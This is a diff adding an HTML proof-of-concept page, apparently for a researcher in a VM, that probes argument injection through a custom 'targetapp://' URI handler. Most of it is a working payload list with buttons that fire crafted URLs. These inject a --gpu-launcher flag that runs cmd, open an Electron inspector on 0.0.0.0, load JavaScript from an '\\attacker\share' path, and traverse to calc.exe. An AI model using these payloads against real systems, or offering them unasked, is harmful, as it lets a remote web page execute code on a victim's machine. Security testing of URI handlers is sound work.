@@ -1,0 +1,39 @@
+<!doctype html>
+<!-- URI-handler PoC for targetapp://
+     Serve this over http (python3 -m http.server) and open it in the VM's browser. The
+     point is that a REMOTE web page reaches a LOCAL application: that is the boundary.
+     Watch the target process's command line in Process Explorer / Procmon while it fires. -->
+<meta charset="utf-8">
+<title>targetapp:// handler probe</title>
+<style>body{font:14px system-ui;margin:2rem;max-width:52rem}code{background:#eee;padding:2px 4px}</style>
+<h1>targetapp:// argument-injection probe</h1>
+<p>Each button navigates to a crafted <code>targetapp://</code> URL. If the handler's
+registry command is <code>"C:\...\app.exe" %1</code> (unquoted <code>%1</code>), the shell
+splits on spaces and everything after the first token becomes additional
+<strong>command-line arguments</strong> to a locally installed program.</p>
+<ol id="cases"></ol>
+<script>
+const payloads = [
+  ["baseline",            "targetapp://test"],
+  ["space split",         "targetapp://x --flag=value"],
+  ["quote break",         "targetapp://x\" --flag=value \""],
+  ["url-encoded space",   "targetapp://x%20--flag=value"],
+  ["chromium gpu-launcher","targetapp://x --gpu-launcher=\"cmd /c echo wh>C:\\\\Users\\\\Public\\\\wh_uri.txt\""],
+  ["electron inspect",    "targetapp://x --inspect-brk=0.0.0.0:9229"],
+  ["node run-as-node",    "targetapp://x --require=\\\\\\\\attacker\\\\share\\\\p.js"],
+  ["path traversal",      "targetapp://../../../../Windows/System32/calc.exe"],
+];
+const ol = document.getElementById('cases');
+for (const [name, url] of payloads) {
+  const li = document.createElement('li');
+  const b = document.createElement('button');
+  b.textContent = name;
+  b.onclick = () => { location.href = url; };
+  const c = document.createElement('code');
+  c.textContent = ' ' + url;
+  li.append(b, c); ol.append(li);
+}
+</script>
+<p><strong>Proof to capture:</strong> the target process's full command line (Process Explorer →
+Properties → Image), plus <code>C:\Users\Public\wh_uri.txt</code> if a launcher flag landed.
+A screenshot of calc.exe is not proof; the command line is.</p>
